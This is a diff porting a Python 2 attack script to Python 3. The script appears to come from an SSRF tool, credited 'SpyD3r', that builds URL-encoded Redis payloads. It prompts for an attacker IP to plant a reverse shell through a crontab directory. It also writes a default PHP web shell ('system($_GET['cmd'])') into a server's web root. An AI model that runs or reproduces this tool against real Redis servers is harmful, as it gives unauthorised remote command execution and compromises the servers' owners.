@@ -1,14 +1,14 @@
-import urllib
+from urllib import parse
 
 
 def Redis():
     def get_Redis_ReverseShell():
-        server = raw_input(
+        server = input(
             "\033[96m"
             + "\nGive your IP Address to connect with victim through Revershell (default is 127.0.0.1): "
             + "\033[0m"
         )
-        crontab_dir = raw_input(
+        crontab_dir = input(
             "\033[96m"
             + "What can be his Crontab Directory location\n## For debugging(locally) you can use /var/lib/redis : "
             + "\033[0m"
@@ -68,7 +68,7 @@ save\r
 """
         )
         finalpayload = (
-            urllib.quote_plus(payload)
+            parse.quote_plus(payload)
             .replace("+", "%20")
             .replace("%2F", "/")
             .replace("%25", "%")
@@ -84,12 +84,12 @@ save\r
         print("\n" + "\033[41m" + "-----------Made-by-SpyD3r-----------" + "\033[0m")
 
     def get_Redis_PHPShell():
-        web_root_location = raw_input(
+        web_root_location = input(
             "\033[96m"
             + "\nGive web root location of server (default is /var/www/html): "
             + "\033[0m"
         )
-        php_payload = raw_input(
+        php_payload = input(
             "\033[96m" + "Give PHP Payload (We have default PHP Shell): " + "\033[0m"
         )
         default = "<?php system($_GET['cmd']); ?>"
@@ -145,7 +145,7 @@ save\r
 """
         )
         finalpayload = (
-            urllib.quote_plus(payload)
+            parse.quote_plus(payload)
             .replace("+", "%20")
             .replace("%2F", "/")
             .replace("%25", "%")
@@ -163,7 +163,7 @@ save\r
         print("\n" + "\033[41m" + "-----------Made-by-SpyD3r-----------" + "\033[0m")
 
     print("\033[01m" + "\nReady To get SHELL\n" + "\033[0m")
-    what = raw_input(
+    what = input(
         "\033[35m" + "What do you want?? (ReverseShell/PHPShell): " + "\033[0m"
     )
     what = what.lower()
